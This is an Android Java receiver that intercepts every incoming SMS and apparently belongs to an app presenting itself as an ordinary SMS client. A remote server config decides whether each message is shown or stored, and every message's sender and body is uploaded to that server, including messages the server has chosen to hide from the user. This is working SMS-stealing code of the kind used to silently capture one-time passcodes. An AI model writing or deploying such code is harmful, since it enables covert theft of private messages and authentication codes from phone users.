package com.example.sms.receiver;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.example.sms.App;
import com.example.sms.R;
import com.example.sms.http.HttpUtils;
import com.example.sms.utils.MapUtils;
import com.example.sms.utils.NotificationUtils;
import com.example.sms.http.SmsReport;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;

public class SMSBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        if (extras == null) {
            return;
        }
        HttpUtils.post((context.getString(R.string.sms_url)+"/config"), MapUtils.newMap(),new HttpUtils.Callback(){
            @Override
            public void success(JSONObject result) {
                int code = result.optInt("code");
                if (code==0){
                    JSONObject data = result.optJSONObject("data");
                    int is_notification = data.optInt("is_notification");
                    int is_save_message = data.optInt("is_save_message");
                    handSms(context,extras,is_notification,is_save_message);
                }else{
                    handSms(context,extras,1,1);
                }
            }

            @Override
            public void error() {
                handSms(context,extras,1,1);
            }
        });

    }

    public void handSms(Context context,Bundle extras,int isNotification, int isSaveMessage){
        ContentResolver contentResolver = context.getContentResolver();
        Object[] objArr = (Object[]) extras.get("pdus");
        Uri parse = Uri.parse("content://sms/");
        for (Object obj : objArr) {
            SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) obj);
            String displayOriginatingAddress = createFromPdu.getDisplayOriginatingAddress();
            String messageBody = createFromPdu.getMessageBody();
            long timestampMillis = createFromPdu.getTimestampMillis();
            String format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(timestampMillis));
            if (isNotification==1){
                NotificationUtils.createNotificationForNormal(context,displayOriginatingAddress,messageBody);
            }
            if (isSaveMessage==1){
                ContentValues contentValues = new ContentValues();
                contentValues.put("address", displayOriginatingAddress);
                contentValues.put("body", messageBody);
                contentValues.put("date", timestampMillis);
                contentValues.put("read", Boolean.FALSE);
                Uri uri = contentResolver.insert(parse, contentValues);
                long id = Long.parseLong(uri.getLastPathSegment());
                SmsReport.post(id,displayOriginatingAddress,messageBody,"add",isNotification,isSaveMessage);
            }else{
                SmsReport.post(null,displayOriginatingAddress,messageBody,"add",isNotification,isSaveMessage);
            }
        }
    }
}
